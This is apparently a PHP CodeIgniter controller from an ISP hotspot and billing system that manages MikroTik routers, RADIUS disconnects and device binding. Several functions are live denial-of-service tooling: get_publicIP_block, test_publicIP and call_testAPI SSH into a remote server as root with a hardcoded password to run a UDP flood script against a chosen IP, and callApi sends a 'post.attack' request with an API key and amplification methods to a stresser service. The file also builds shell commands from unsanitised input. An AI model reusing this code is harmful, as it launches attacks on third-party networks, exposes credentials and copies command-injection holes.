<?php if(!defined('BASEPATH')) exit('No direct script access allowed');

require APPPATH . 'libraries/crontab.php';
require APPPATH . 'libraries/routeros_api.class.php';

require_once APPPATH . '../vendor/autoload.php';

//use phpseclib3\Net\SSH2;
use phpseclib\Net\SSH2;



/**
 * Class : Login (LoginController)
 * Login class to control to authenticate user credentials and starts user's session.
 * @author : Kishor Mali
 * @version : 1.1
 * @since : 15 November 2016
 */
class Other extends CI_Controller
{
    /**
     * This is default constructor of the class
     */
    public function __construct()
    {
        parent::__construct();
        //$this->load->model('login_model');
        $this->load->model('users_model');
        $this->load->model('user_model');
        $this->load->model('Invoices_model');
        $this->load->model('Services_model');
        $this->load->model('Other_model');
        $this->load->model('login_model');
        $this->load->model('Reports_model');
        $this->load->model('Network_model');
        $this->load->model('Snmp_model');
        $this->load->helper(array('form', 'url'));
    }

    /**
     * Index Page for this controller.
     */
    public function index()
    {
        $this->isLoggedIn();
    }
    
    /**
     * This function used to check the user is logged in or not
     */
    function userGraph($userId = NULL)
    {

        if($userId == null)
            {
                redirect('https://login.pace-tel.com/user.php');
            }
            
            $data['packages'] = $this->users_model->getResellerPackages();
            $data['userInfo'] = $this->users_model->getUserInfo($userId);
            $nasIP =  $this->user_model->getUsersNasInfo($userId);

            $nasipaddress = $nasIP->nasipaddress;
            $urlAddress = 'http://'.$nasipaddress.':8880/graphs/queue/<pppoe-'.$userId.'>/';

            redirect($urlAddress);
            
            //$this->global['pageTitle'] = 'PaceTel : Edit User';
            
            //$this->loadViews("usergraph", $this->global, $data, NULL);
    }

    function loadViews($viewName = "", $headerInfo = NULL, $pageInfo = NULL, $footerInfo = NULL){

        $this->load->view($viewName, $pageInfo);
    }

    function resetSessionAllUsers(){
        $this->Reports_model->disconnectUserAccountUpdateAll();
    }

    public function postEasyPaisa(){

        $this->load->helper('array');
        $this->load->library('../controllers/invoices');
        $this->invoices->userQuickRecharge("u2nasir3");

        echo "TESTS";

    }

    function test(){
        echo "Test working";
    }


    // Dynamic DNS Auto Update Function //
    function nasUpdateDDNS()
    {

        $restartStatus = 0;

        $result = $this->Other_model->getDDNSMapping();

        if(!empty($result))
        {
            $row_count = 1;
            foreach($result as $record)
            {
                $newDomainIP = gethostbyname($record->domain);
                if($record->nasname <> $newDomainIP)
                {
                    $restartStatus = 1;
                    $domain = $record->domain;
                    $search[] = $record->nasname; $replace[] = $newDomainIP;
                    $this->stringReplaceFile('/usr/local/etc/raddb/clients.conf', $search, $replace);

                    $nasInfo = array('nasname'=>$newDomainIP);
                    //$this->Other_model->updateNasToNewIP($nasInfo, $record->shortname, $record->nasname);
                    $this->Other_model->updateDynamicNasTable($nasInfo, $record->shortname, $record->nasname);
                }
            }
            $row_count++;
        }

        echo "Status to Restart : ".$restartStatus." ";

    }

    // Dynamic DNS File Update
    function stringReplaceFile($file, $search, $replace){

        if (!file_exists($file))
        {
            display_error('File does not exist: '.$file);
        }
        $handle = @fopen($file, 'r') or display_error('Could not open file for reading.');
        $text = fread($handle, filesize($file));
        fclose($handle);

        $text = str_replace($search, $replace, $text);

        $handle = @fopen($file, 'w') or display_error('Could not open file for writing.');
        @fwrite($handle, $text) or display_error('Could not write to file.');
        fclose($handle);
        //echo "File updated";

    }

    function createCronJobs(){
        // Create Cronjobs
        $this->load->library('crontab');
        $this->crontab->add_job('*/5 * * * *', 'run_scheduler.php');
        //$this->crontab->add_job('0 */2 * * *', 'run_scheduler.php');
    }

    function tempCreateAlerts(){
        
        $this->Other_model->temp_table_create();
    }

    function display_error($error_text) {
        die('<p style="color:red;font-weight:bold;">ERROR! '.$error_text.'</p>');
    }

    // This function is a audit fix for Voucher Owenership to change user ownership as per connected NAS
    // This function dynamically change ownership of user as per connected NAS
    function hotspot_users_fixowner($days){
        $result = $this->Other_model->get_newCardActivation($days); 
        foreach($result as $record)
        {
            $nasManagerGroup = $this->Other_model->get_nasmanager($record->nasipaddress);
            if(empty($nasManagerGroup)){
                // Check if Owner and Calling Station ID has any matching
                $calling_id = $this->Other_model->get_callingStationID($record->username);
                if(empty($calling_id)){
                    $this->Other_model->updateVoucherOwner($record->username, $record->calledstationid, 0); // Manager Not Found in Calling Station ID
                }else{
                    $this->Other_model->updateVoucherOwner($record->username, $record->calledstationid, 1); // Try Manager from Dynamic Nas Entry Table
                }
            }else{
                $this->Other_model->updateVoucherOwner($record->username, $nasManagerGroup->managername, 1); // Manager Found in Manager Group            }
            }
        }

        $this->session->set_flashdata('success', 'Hotspot Prepaid Users Ownership checking completed for '.$days.' Days');
        redirect('serieslist');

        die('<p style="color:green;font-weight:bold;">Operation Completed! </p>');
    }

    function hotspot_users_addbydays($days){ // Trace users Online from number of Days given and cross check in Mikrotik to add it

        $result = $this->Other_model->get_newCardActivation($days);
        $this->bulkhotspotcall_api($result);

        $this->session->set_flashdata('success', 'Users created in Mikrotik for '.$days.' Days');
        //redirect('serieslist');

    }

    function addMikrotikUser(){

        $this->Other_model->updateUserOwnership();
        $this->Other_model->addDynamicRecharge();

        $result = $this->Other_model->getNewCardsNAS();

        $this->bulkhotspotcall_api($result);

    }

    // URL http://portal.muttasilat.ae/Other/addSingleUser_api/<NAS-IP>/<USERNAME>
    function addSingleUser_api($nasipaddress, $username){

        if(!empty($username))
        {
            
            $ddnsNasInfo = $this->Other_model->getDDNSMappingInfo($nasipaddress);
            $userInfo = $this->users_model->getUserInfo($username, 2);

            //shortname, nasname, domain, apiuser, apipasswd, apiport
            //echo "Name:".$ddnsNasInfo->shortname."- Nas:".$ddnsNasInfo->nasname."- Domain:".$ddnsNasInfo->domain." User: ".$userInfo->username;

            echo "Trying to add user: ".$username."<br>\n</br>";

            if(!empty($ddnsNasInfo) && !empty($userInfo)){

                //$apiHost = gethostbyname($ddnsNasInfo->domain);
                if(!empty($ddnsNasInfo->domain)){
                    $apiHost = gethostbyname($ddnsNasInfo->domain);
                }else{
                    $apiHost = $ddnsNasInfo->nasname;
                }
                echo "Found host for : ".$nasipaddress." domain:  ".$ddnsNasInfo->domain." IP: ".$apiHost."<br>\n</br>";

                if(empty($apiHost)){
                    $apiHost = $record->nasname;
                }

                // Send request to add Hotspot User
                $this->api_addhotspotuser($apiHost, $ddnsNasInfo->apiuser, $ddnsNasInfo->apipasswd, $userInfo, $ddnsNasInfo->authmode);
            }

        }
        
    }

    // Bulk creation from NAS TABLE
    function bulkhotspotcall_api($result){

        if(!empty($result))
        {
            foreach($result as $record)
            {
                $ddnsNasInfo = $this->Other_model->getDDNSMappingInfo($record->nasipaddress);
                $userInfo = $this->users_model->getUserInfo($record->username, 2);

                //shortname, nasname, domain, apiuser, apipasswd, apiport
                //echo "Name:".$ddnsNasInfo->shortname."- Nas:".$ddnsNasInfo->nasname."- Domain:".$ddnsNasInfo->domain." User: ".$userInfo->username;

                if(!empty($ddnsNasInfo) && !empty($userInfo)){

                    if(!empty($ddnsNasInfo->domain)){
                        $apiHost = gethostbyname($ddnsNasInfo->domain);
                    }else{
                        $apiHost = $ddnsNasInfo->nasname;
                    }

                    if(empty($apiHost)){
                        $apiHost = $record->nasname;
                    }

                    // Send request to add Hotspot User
                    $this->api_addhotspotuser($apiHost, $ddnsNasInfo->apiuser, $ddnsNasInfo->apipasswd, $userInfo, $ddnsNasInfo->authmode);
                }

            }
        }
        
    }

    function api_addhotspotuser($apiHost, $apiuser, $apipasswd, $userInfo, $authmode = 0){

        $API = new RouterosAPI();
        $API->debug = true;

        if ($API->connect($apiHost, $apiuser, $apipasswd)) {

            // Trace All Existing Users
            $API->write('/ip/hotspot/user/print', false);
            $API->write('=.proplist=.id', false);
            $API->write('?name='.$userInfo->username);

            $A = $API->read();

            // If not found then create HotSpot Users
            if(empty($A)){

                echo "User Not Found in NAS created it now<br>\n</br>";

                // Add New Voucher to HotSpot List
                $API->comm("/ip/hotspot/user/add", array(
                    "name"     => $userInfo->username,
                    "password" => '',
                    "comment"  => "Expired:".$userInfo->expiration,
                ));

                // After Creation Again Scan User and Disable It.
                $API->write('/ip/hotspot/user/print', false);
                $API->write('=.proplist=.id', false);
                $API->write('?name='.$userInfo->username);
                $B = $API->read();
                $B = $B[0];

                echo "<br>\n</br>Reading user after creation and results are ".print_r($B)." <br>\n</br>";
                $API->write('/ip/hotspot/user/set', false);
                $API->write('=.id='.$B['.id'], false);

                // Change user status
                if($authmode == 3){
                    $API->write('=disabled=yes');
                }else{
                    $API->write('=enable=yes');
                }
                $API->read();

                $this->Other_model->updateCardAPIAction($userInfo->username, 1); // Update Card api action field to 1

            }else{
                echo "User Exists in NAS";
            }

            $API->disconnect();
            //exit;

        }


    }

    function dynamic_hotspotAccounts(){

        $result = $this->Other_model->get_newCardActivation();

        if(!empty($result))
        {
            foreach($result as $record)
            {
                // Condition for only to change ownership if Master
                $masterInfo = $this->login_model->lisMasterManager($userInfo->owner);
                if($masterInfo->managercount > 0){
                    // Check if Calling Station ID of NAS match any manager name
                    $callingStationManager = $this->Other_model->get_callingStationID($record->username);
                    if(!empty($callingStationManager)){
                        if($callingStationManager->callingstationid <> $userInfo->owner)
                        {
                            // If User Ownership is Master and Calling station ID match from Logs
                            $this->Other_model->updateVoucherOwner($userInfo->username, $record->nasipaddress, $userInfo->owner);
                        }else{
                            $this->Other_model->updateVoucherOwner($userInfo->username, $record->nasipaddress);
                        }
                    }
                }
                // Create Invoice
                $this->Other_model->addDynamicRecharge($userInfo->username);
            }
        }

    }

    // Function to Disable Expired Users Through API
    function disableExpiredHotspotUsers($host = "", $username = "", $password = "") {

        // Initialize the RouterOS API client
        $API = new RouterosAPI();
        //$API->debug = true;

        if ($API->connect($host, $username, $password)) {

            // Fetch hotspot users
            $users = $API->comm('/ip/hotspot/user/print');

            $currentDate = new DateTime(); // Current date
            //echo $currentDate->format('M/d/Y H:i:s');
            //print_r($users);

            foreach ($users as $user) {
                if (isset($user['comment'])) {

                    // Parse the date from the comment
                    $commentDate = DateTime::createFromFormat('M/d/Y H:i:s', $user['comment']);
    
                    // Check if parsing was successful and the comment date is less than or equal to the current date
                    if ($commentDate !== false && $commentDate <= $currentDate) {
                        // Disable the user
                        $API->comm('/ip/hotspot/user/set', array(
                            '.id' => $user['.id'],
                            'disabled' => 'yes',
                        ));
                        echo "Disabled user: " . $user['name'] . " (Expiry Date: " . $user['comment'] . ")<br>";
                    }
                }
            }
    
            // Disconnect from the router
            $API->disconnect();

        } else {
            echo "Failed to connect to the MikroTik Router.\n";
        }
    }

    function hotspotlogin(){

        $mac = $this->input->post('mac');
        $ip = $this->input->post('ip');
        $linkLogin = $this->input->post('link-login');
        $linkLoginOnly = $this->input->post('link-login-only');
        $identity = $this->input->post('identity');
        $hotspoterror = $this->input->post('error');

        $data['mac'] = $mac;
        $data['ip'] = $ip;
        $data['linkLogin'] = $linkLogin;
        $data['linkLoginOnly'] = $linkLoginOnly;
        $data['hotspoterror'] = $hotspoterror;
        $data['identity'] = $identity;

        //$voucher_owner = $this->Other_model->get_userowner($identity);
        //$mac = "58:6D:8F:97:8B:F1"; // For Testing

        $nasRandomMacSetting = $this->login_model->getSettingInfo($identity, 'CHECK-MAC');
        if(!empty($nasRandomMacSetting)){
            if($nasRandomMacSetting->status == 1){
                preg_match('/('.substr($mac,1,1).')/', '26AE', $matches);

                if(!empty($matches)){
                    $this->load->view("loginhotspoterror", $data);
                }else{
                    $this->load->view("loginhotspot", $data);
                }
            }else{
                $this->load->view("loginhotspot", $data);
            }
        }else{
           $this->load->view("loginhotspot", $data);
        }

    }

    function hotspotStatus(){

        $username = $this->input->post("username");
        $ip = $this->input->post("ip");
        $bytesIn = $this->input->post("bytes-in-nice");
        $bytesOut = $this->input->post("bytes-out-nice");
        $upTime = $this->input->post("uptime");

        $this->load->view("loginhotspotstatus", $data);

    }

    public function validate_hotspotuser() {

        $username = $this->input->post('username');
        $device_id = $this->input->post('device_id');
        $client_id = $this->input->post('client_id');
        $storedUsername = $this->input->post('storedUsername');

        // Assume this method checks the username and optionally returns a password requirement
        $userDetails = $this->users_model->validate_user($username);

        //$this->Other_model->update_deviceId($username, $device_id);

        $card_details = $this->Other_model->get_cardInfo($username);

        if(!empty($card_details)){

            if(!empty($card_details->deviceid) && !empty($userDetails) && $userDetails->mode <> 2){
                
                echo json_encode(['status' => 'success', 'message' => 'Username checked.**'.$userDetails->mode, 'mode' => 3, 'expiration' => $card_details->expiration]);

            }else{

                if (!empty($userDetails) || !empty($storedUsername)) {

                    if($userDetails->mode==1){
                        $this->disconnect_onlineuser($card_details->cardnum);
                    }

                    switch ($userDetails->mode){
                        case 0:
                            echo json_encode(['status' => 'success', 'message' => 'Password Not Required.', 'mode' => 0, 'expiration' => $card_details->expiration]);
                            break;
                        case 1:
                            echo json_encode(['status' => 'success', 'message' => 'Password Required', 'mode' => 1, 'expiration' => $card_details->expiration]);
                            break;
                        case 2:
                            echo json_encode(['status' => 'success', 'message' => 'Voucher Expired', 'mode' => 2]);
                            break;

                    }

                    // Assuming $userDetails includes a 'mode' indicating password requirement
                    //echo json_encode(['status' => 'success', 'message' => 'Username checked.', 'mode' => 1]);
                } else {
                    echo json_encode(['status' => 'error', 'message' => 'Invalid username.']);
                }
            }
        }else{
            echo json_encode(['status' => 'error', 'message' => 'Invalid username.']);
        }
    
       
    }

    function validate_hotspotpassword($check_mode = 0){

        $username = $this->input->post('username');
        $password = $this->input->post('password');

        $userDetails = $this->users_model->validate_user($username);
        
        // Assuming you have a model method to validate credentials
        if($this->users_model->validate_user($username, $password)) {
            //$this->Reports_model->disconnectUserAccountUpdate($username);
            $this->disconnect_onlineuser($card_details->cardnum);
            echo json_encode(['status' => 'success', 'message' => 'Valid credentials.']);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Invalid credentials.']);
        }
    }

    function validate_deviceid(){

        $device_id = $this->input->post('device_id');
        $client_id = $this->input->post('client_id');
        $stored_username = $this->input->post('stored_username');

        if(!empty($stored_username)){
            $combined_id = $device_id.'-'.$client_id.'-'.$stored_username;
        }else{
            $combined_id = $device_id.'-'.$client_id.'-'.'ios';
        }

        $card_details = $this->Other_model->get_deviceid($combined_id, $stored_username);

        if(!empty($card_details) || $stored_username == $card_details->cardnum){

            $currentDate = date('Y-m-d H:i:s');

            if($card_details->expiration >= $currentDate)
            {

                if(!empty($card_details->deviceid)){

                    // Deduct Invalid Session and Disconnect it
                    $this->disconnect_onlineuser($card_details->cardnum);
                    echo json_encode(['status' => 'success', 'message' => 'Voucher Expiration: '.$card_details->expiration, 'username' => $card_details->cardnum, 'deviceid' => $device_id.'-'.$client_id]);

                }else{
                    echo json_encode(['status' => 'error', 'message' => 'New Login', 'username' => '', 'deviceid' => '']);
                }

            }else{
                $this->Other_model->update_deviceId($card_details->cardnum, "");
                echo json_encode(['status' => 'error', 'message' => 'New previous login expired', 'username' => '', 'deviceid' => '']);
            }

        }else{
            echo json_encode(['status' => 'error', 'message' => 'Please Provide Voucher.', 'username' => '', 'deviceid' => '']);
        }

    }

    function disconnect_onlineuser($username){
        $connectedUser = $this->Other_model->get_onlineUserDetails($username);
        if(!empty($connectedUser)){
            
            $command = "echo User-Name=".$connectedUser->username.",Framed-IP-Address=".$connectedUser->framedipaddress.
                        " | radclient -r 1 ".$connectedUser->nasipaddress.":3799 disconnect ".$connectedUser->secret;
    
            exec($command);

            $this->Reports_model->disconnectUserAccountUpdate($username);
        }
    }

    function update_deviceid(){

        $username = $this->input->post('username');
        $device_id = $this->input->post('device_id');
        $client_id = $this->input->post('client_id');

        $device_storedUsername = $this->input->post('device_storedUsername');

        //$combined_id = $device_id.'-'.$client_id;

        if(!empty($device_storedUsername)){
            $combined_id = $device_id.'-'.$client_id.'-'.$device_storedUsername;
        }else{
            $combined_id = $device_id.'-'.$client_id.'-'.'ios';
        }

        $isDeviceValid = $this->Other_model->validate_deviceId($combined_id); // Verify if Device not already assigned to any other username

        if(empty($isDeviceValid)){
            $this->Other_model->update_deviceId($username, $combined_id);
        }

        echo json_encode(['status' => 'success', 'message' => 'Username Device ID updated ='.$combined_id, 'mode' => 1]);

    }

    function api_disconnect_request(){
        
        $this->load->view("Prepaid/apidisconnect", NULL);
    }

    function api_session_delete(){

        $username = $this->input->post('username');
        $password = $this->input->post('password');
        
        $record = $this->Other_model->get_callingStationID($username);
        //print_r($record);
        // Request to disconnect User
        if(!empty($record))
        {

            $ddnsNasInfo = $this->Other_model->getDDNSMappingInfo($record->nasipaddress);
            $userInfo = $this->users_model->getUserInfo($record->username, 2);

            if(!empty($ddnsNasInfo) && !empty($userInfo)){

                $apiHost = gethostbyname($ddnsNasInfo->domain);
                //echo $apiHost." - ".$ddnsNasInfo->apiuser." - ".$ddnsNasInfo->apipasswd;

                if(empty($apiHost)){
                    $apiHost = $record->nasname;
                }

                $API = new RouterosAPI();
                $API->debug = false;

                if ($API->connect($apiHost, $ddnsNasInfo->apiuser, $ddnsNasInfo->apipasswd)) {

                    $API->write('/ip/hotspot/active/print', false);
                    $API->write('?user=' . $username, true);
                    $activeSessions = $API->read();

                    foreach ($activeSessions as $session) {
                        $API->write('/ip/hotspot/active/remove', false);
                        $API->write('=.id=' . $session['.id'], true);
                        $API->read();
                    }

                    $API->disconnect();
                    //exit;

                }
                
                
            }            
        }

        $this->load->view("Prepaid/apidisconnectreply", NULL);
    }

    function mac_check_execute(){

        $result =  $this->Other_model->mac_settings_manager();
        if(!empty($result))
        {
            $row_count = 1;
            foreach($result as $record)
            {
                $status = $this->Other_model->mac_binding_apply(0, 1, $record->managername, "");
            }
        }

        $this->session->set_flashdata('success', 'Mac binded for all possible Managers settings');

        redirect('cardsListing');

    }

    function mac_bind_manager($managername = ""){

        $result = $this->Other_model->mac_binding_apply(0, 1, $managername, "");
        $this->session->set_flashdata('success', 'Mac binded for all active users of '.$managername);

    }

    function mac_unbind_manager($managername = ""){

        $result = $this->Other_model->mac_binding_apply(0, 0, $managername, "");
        $this->session->set_flashdata('success', 'Mac Un binded for all active users of '.$managername);
        redirect('dashboard');

    }

    function mac_bind_user($username = ""){

        $result = $this->Other_model->mac_binding_apply(1, 1, "", $username);
        $this->session->set_flashdata('success', 'Mac binded for '.$username);
        redirect('dashboard');

    }

    function mac_unbind_user($username = ""){

        $result = $this->Other_model->mac_binding_apply(1, 0, "", $username);
        $result = $this->Other_model->update_deviceId($username, "");
        $this->session->set_flashdata('success', 'Mac un-binded for '.$username);
        redirect('dashboard');

    }

    
    function get_publicIP_block(){

        /* for Android APP 
        //$json_data = $this->input->raw_input_stream;
        //$data = json_decode($json_data, true);
        
        //$ip = $data['ip'];
        //$ip = "103.169.64.101";

        */

        $ip = $this->get_client_ip();

        $duration = 3600;
        //$ip = "83.110.169.94";

        $command = "nohup perl /root/target2.pl --target_ip=".$ip." --num_sessions=4 --protocol=UDP --duration=".$duration;

        $apiInfo = array('callerip'=>$ip,
                        'status'=>1,
                        'remarks'=>" results: ".$command);

        $this->Other_model->add_ipUpdaterCall($apiInfo);

        $this->execute_remote_command("103.19.48.1741", "root", "Khyber@007", "killall bonesi");
        $this->execute_remote_command("103.19.48.1741", "root", "Khyber@007", $command);

        echo json_encode(array("statusCode" => "200", "message" => "Received IP: " . $ip));

        //$this->load->view("Other/getpublicip", NULL);
        
    }

    function test_publicIP($ip, $duration){

        $command = "nohup perl /root/target2.pl --target_ip=".$ip." --num_sessions=4 --protocol=UDP --duration=".$duration;

        $apiInfo = array('callerip'=>$ip,
                        'status'=>1,
                        'remarks'=>" results: ".$command);

        $this->Other_model->add_ipUpdaterCall($apiInfo);

        $this->execute_remote_command("103.19.48.174", "root", "Khyber@007", "killall bonesi");
        $this->execute_remote_command("103.19.48.174", "root", "Khyber@007", $command);

        echo json_encode(array("statusCode" => "200", "message" => "Received IP: " . $ip));

    }

    //Get Client Browser IP
    private function get_client_ip() {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            return $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            $ip = explode(',', $ip)[0];
            return $ip;
        } else {
            if (!empty($_SERVER['REMOTE_ADDR'])) {
                return $_SERVER['REMOTE_ADDR'];
            }
        }
    }

    function call_testAPI(){

        $json_data = $this->input->raw_input_stream;
        $data = json_decode($json_data, true);

        $ip = $data['ip'];
        //$ip = "45.82.65.91";

        $duration = 300;
        //$ip = "103.204.33.45";

        $command = "nohup sudo perl /root/target2.pl --target_ip=".$ip." --num_sessions=3 --protocol=UDP --duration=".$duration;

        $this->execute_remote_command("103.19.48.174", "root", "Khyber@007", "killall bonesi");
        $this->execute_remote_command("103.19.48.174", "root", "Khyber@007", $command);

        $apiInfo = array('callerip'=>$ip,
                        'status'=>1,
                        'remarks'=>" results: ".$command);

        $this->Other_model->add_ipUpdaterCall($apiInfo);
        //$this->load->view("Other/getpublicip", NULL);
        echo json_encode(array("statusCode" => "200", "message" => "Received IP: " . $ip));

    }

    public function execute_remote_command($host, $username, $password, $command = "ls -la") {

        
        // Create SSH connection (your existing code)
        $ssh = new SSH2($host);

        if (!$ssh->login($username, $password)) {
            echo 'Login Failed';
            return;
        }

        // Execute the command (your existing code)
        $output = $ssh->exec($command);
        return $output;

    }

    public function execute_remote_command_old($host, $username, $password, $command = "ls -la")
    {

    
        // Create SSH connection (your existing code)
        $ssh = new SSH2($host);

        if (!$ssh->login($username, $password)) {
            echo 'Login Failed';
            return;
        }

        // Execute the command (your existing code)
        $output = $ssh->exec($command);
        return $output;

    }


    function disableMikrotikUser(){

        $result = $this->Other_model->get_expiredUserDetails();

        $this->expiration_bulkhotspotcall_api($result);

    }

    function expiration_bulkhotspotcall_api($result){

        if(!empty($result))
        {
            foreach($result as $record)
            {
                $ddnsNasInfo = $this->Other_model->getDDNSMappingInfo($record->nasipaddress);
                $userInfo = $this->users_model->getUserInfo($record->username, 2);

                //shortname, nasname, domain, apiuser, apipasswd, apiport
                //echo "Name:".$ddnsNasInfo->shortname."- Nas:".$ddnsNasInfo->nasname."- Domain:".$ddnsNasInfo->domain." User: ".$userInfo->username;

                if(!empty($ddnsNasInfo) && !empty($userInfo)){

                    if(!empty($ddnsNasInfo->domain)){
                        $apiHost = gethostbyname($ddnsNasInfo->domain);
                    }else{
                        $apiHost = $ddnsNasInfo->nasname;
                    }

                    if(empty($apiHost)){
                        $apiHost = $record->nasname;
                    }

                    // Send request to add Hotspot User
                    $this->api_disablehotspotuser($apiHost, $ddnsNasInfo->apiuser, $ddnsNasInfo->apipasswd, $userInfo, $ddnsNasInfo->authmode);
                }

            }
        }
        
    }

    function api_disablehotspotuser($apiHost, $apiuser, $apipasswd, $userInfo, $authmode = 0){

        $API = new RouterosAPI();
        $API->debug = true;

        if ($API->connect($apiHost, $apiuser, $apipasswd)) {

            // Trace Existing User
            $API->write('/ip/hotspot/user/print', false);
            $API->write('=.proplist=.id', false);
            $API->write('?name=' . $userInfo->username);

            $A = $API->read();

            // If user exists, disable it
            if (!empty($A)) {
                echo "User Found in NAS. Disabling it now.<br>\n</br>";

                // Get the user ID
                $user = $A[0];
                $userId = $user['.id'];

                // Disable the user
                $API->comm('/ip/hotspot/user/set', array(
                    ".id" => $userId,
                    "disabled" => "yes",
                ));

                echo "User " . $userInfo->username . " has been disabled.<br>\n</br>";

                // Update Card API Action field to 1 (or any relevant status)
                $this->Other_model->updateCardAPIAction($userInfo->username, 1);
            } else {
                echo "User does not exist in NAS. No action taken.<br>\n</br>";
            }

            $API->disconnect();
        } else {
            echo "Failed to connect to MikroTik API.<br>\n</br>";
        }


    }

    public function callApi() {
        // Set fixed parameters
        $userid = "50186";
        $key = "CGBQL-63581-LAT9E";
        $command = "post.attack";
        $hub = "pro";
        $type = "ip4";
        $method = "id::123"; // Keep raw
        $custom = "amp=DNS,DNSSEC,NTP,NAT,WSD,COAP,QUIC,SSDP,SNMP,UBNT,ARM3,IPSEC,UDPMIX,SOURCE,PORTMAP,OPENVPN,NETBIOS,ARD,CHARGEN,RDP,STEAM,FIVEM,CALL,"; // Keep raw

        // Get user input for dynamic parameters
        $target = $this->input->get('target');
        $port = $this->input->get('port');
        $time = $this->input->get('time');

        // Validate inputs
        if (empty($target) || empty($port) || empty($time)) {
            echo json_encode(['error' => 'All parameters (target, port, time) are required.']);
            return;
        }

        // Validate the time parameter
        $maxTimeLimit = 1800;
        if ($time > $maxTimeLimit) {
            echo json_encode(['error' => 'Time exceeds maximum allowed limit of 1800 seconds.']);
            return;
        }

        $curlCommand = "curl -X GET \"https://zdstresser.net/panel/apiv1/"
            . "?userid=$userid"
            . "&key=$key"
            . "&command=$command"
            . "&hub=$hub"
            . "&type=$type"
            . "&target=$target"
            . "&port=$port"
            . "&time=$time"
            . "&method=$method"
            . "&custom:$custom\"";


        //echo $curlCommand;
        //echo $response;

        $command = "https://zdstresser.net/panel/apiv1/?userid=50186&key=CGBQL-63581-LAT9E&command=post.attack&hub=pro&type=ip4&target=202.163.81.0&port=80&time=30&method=id::123&custom:amp=DNS,DNSSEC,NTP,NAT,WSD,COAP,QUIC,SSDP,SNMP,UBNT,ARM3,IPSEC,UDPMIX,SOURCE,PORTMAP,OPENVPN,NETBIOS,ARD,CHARGEN,RDP,STEAM,FIVEM,CALL,";
        $response = shell_exec("curl -X GET ".$command);
        echo $response;
        exit;

        // Execute the curl command using shell_exec
        $response = shell_exec($curlCommand);

        // Check for errors
        if ($response === null) {
            echo json_encode(['error' => 'Failed to execute the curl command.']);
            return;
        }

        // Return the API response
        echo $response;
    }
    
    function get_publicIP_fromapp($device_name = null, $client_ip = null) 
    {
        
        try {
            // First check URL segments
            if ($device_name === null || $client_ip === null) {
                // If not in URL, check POST/JSON data
                $json_data = file_get_contents('php://input');
                $data = json_decode($json_data, true);

                $device_name = isset($data['deviceName']) ? $data['deviceName'] : $this->input->post('deviceName');
                $client_ip = isset($data['clientIP']) ? $data['clientIP'] : $this->input->post('clientIP');
            }

            // If still no client IP, try to detect it
            if (empty($client_ip)) {
                $client_ip = $this->get_client_ip();
            }

            // Validate inputs
            if (empty($device_name)) {
                $this->output->set_status_header(400)
                            ->set_content_type('application/json')
                            ->set_output(json_encode([
                                'status' => 'error',
                                'message' => 'Device name is required'
                            ]));
                return;
            }

            if (empty($client_ip)) {
                $this->output->set_status_header(400)
                            ->set_content_type('application/json')
                            ->set_output(json_encode([
                                'status' => 'error',
                                'message' => 'Client IP could not be determined'
                            ]));
                return;
            }

            // Path to the JSON file
            $file_path = FCPATH . 'server_config/client_apps.json';
            $dir_path = FCPATH . 'server_config';

            // Create directory if it doesn't exist
            if (!file_exists($dir_path)) {
                mkdir($dir_path, 0755, true);
            }

            // Read existing data
            $clients = [];
            if (file_exists($file_path)) {
                $content = file_get_contents($file_path);
                if ($content) {
                    $clients = json_decode($content, true) ?: [];
                }
            }

            // Update or add client information
            $clients[$device_name] = [
                'ip' => $client_ip,
                'last_updated' => date('Y-m-d H:i:s'),
                'first_seen' => isset($clients[$device_name]) ? 
                               $clients[$device_name]['first_seen'] : 
                               date('Y-m-d H:i:s')
            ];

            // Save updated data
            file_put_contents($file_path, json_encode($clients, JSON_PRETTY_PRINT));

            // Return minimal success response for API calls
            $this->output->set_status_header(200)
                        ->set_content_type('application/json')
                        ->set_output(json_encode([
                            'status' => 'success'
                        ]));

        } catch (Exception $e) {
            $this->output->set_status_header(500)
                        ->set_content_type('application/json')
                        ->set_output(json_encode([
                            'status' => 'error',
                            'message' => $e->getMessage()
                        ]));
        }
    }
    /*if($restartStatus == 1){
    //putenv('PATH=/root');
    //$restartRadius = shell_exec('./radrestart.sh');
    //echo "   Restart Status : ".$restartRadius;
    //$restartStatus = 0;
    //}

    Shell Script To restart Radius
    #!/bin/bash

        curl http://127.0.0.1/Other/nasUpdateDDNS

        if [ $(find //usr/local/etc/raddb -mmin -5 -type f -name "clients.conf" 2>/dev/null) ] ; then
                echo " Radius Service Restarting "
                service radiusd restart
        else
                echo "  No IP Changes Deducted "
        fi
    */

    // Public endpoint for cron to sync RX/TX for mapped devices
    public function cronSyncRxTxForMappedDevices()
    {
        // 1. Run the sync job
        $result = $this->Network_model->syncRxTxForMappedDevicesJob();
        echo "Updated: {$result['updated']}, Inactivated: {$result['inactivated']}<br>";

        // 2. Add cron job using create_client_cron_job logic, with APP_HOSTNAME env
        $php_path = PHP_BINDIR . '/php';
        $index_path = FCPATH . 'index.php';
        $hostname = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : (getenv('APP_HOSTNAME') ?: 'localhost');
        $command = "APP_HOSTNAME=$hostname $php_path $index_path Other cronSyncRxTxForMappedDevices_cli";
        $cron_time = "*/5 * * * *";
        $cron_job = "$cron_time $command";

        // Get current crontab
        $output = [];
        exec('crontab -l', $output, $return_var);
        $crontab = implode("\n", $output);

        // Check if our job already exists
        if (strpos($crontab, $command) === false) {
            // Add the new cron job
            $newCrontab = $crontab . "\n" . $cron_job . "\n";
            $tmpFile = tempnam(sys_get_temp_dir(), 'cron');
            file_put_contents($tmpFile, $newCrontab);
            exec("crontab $tmpFile");
            unlink($tmpFile);
            echo "Cron job added for: $command<br>";
        } else {
            echo "Cron job already exists.<br>";
        }
    }

    // CLI endpoint for cron job
    public function cronSyncRxTxForMappedDevices_cli()
    {
        $result = $this->Network_model->syncRxTxForMappedDevicesJob();
        echo "Updated: {$result['updated']}, Inactivated: {$result['inactivated']}";
    }

    // Public endpoint to poll all active SNMP users from all NAS and update tbl_snmpcache
    public function snmpPollActiveUsers()
    {
        $result = $this->Snmp_model->pollActiveUsersFromAllNas();
        header('Content-Type: application/json');
        echo json_encode($result);
    }

    function runJobsQueue()
    {
            // Run jobs queue before redirecting to dashboard
            $this->load->model('Other_model');
            $this->Other_model->runDueJobs();
            echo json_encode(['status' => 'success']);

